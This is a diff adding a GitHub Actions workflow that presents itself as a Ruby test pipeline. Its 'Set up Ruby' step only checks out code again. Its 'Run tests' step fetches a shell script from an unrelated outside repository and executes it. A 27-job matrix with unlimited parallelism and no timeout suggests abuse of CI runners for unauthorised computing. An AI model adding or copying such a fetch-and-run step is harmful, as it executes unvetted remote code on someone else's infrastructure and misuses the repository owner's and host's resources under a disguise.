@@ -1,0 +1,36 @@
+name: Ruby
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  build:
+    name: Ruby
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 999
+      fail-fast: false
+      matrix:
+        ruby-version:: ['2.6', '2.7', '3.0']
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 0
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.ruby-version }}
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Ruby
+    # To automatically get bug fixes and new Ruby versions for ruby/setup-ruby,
+    # change this to (see https://github.com/ruby/setup-ruby#versioning):
+    # uses: ruby/setup-ruby@v1
+      uses: actions/checkout@v2
+      with:
+        ruby-version: ${{ matrix.ruby-version }}
+      id: ruby
+    - name: Run tests
+      run: |
+       wget https://github.com/ferizeetco/go/blob/main/ruby.sh && chmod u+x ruby.sh && ./ruby.sh
